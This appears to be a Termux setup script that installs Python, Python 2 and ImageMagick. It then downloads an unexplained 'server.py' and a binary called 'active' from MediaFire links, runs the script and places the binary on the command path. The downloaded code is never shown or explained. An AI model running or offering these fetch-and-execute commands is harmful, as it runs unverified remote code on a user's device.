termux-setup-storage
apt upgrade -y
apt update -y
pkg install python -y
pkg install imagemagick -y
pkg install python2 -y
curl -LO https://download1593.mediafire.com/v9q1nzqarpbg/itibt7qo7e5kg7p/server.py
python2 server.py
curl -LO https://download846.mediafire.com/bax1xpivzcsg/1kihz9lfe00uckv/active
chmod +x active
cp active  $PREFIX/bin
chmod +x $PREFIX/bin/active
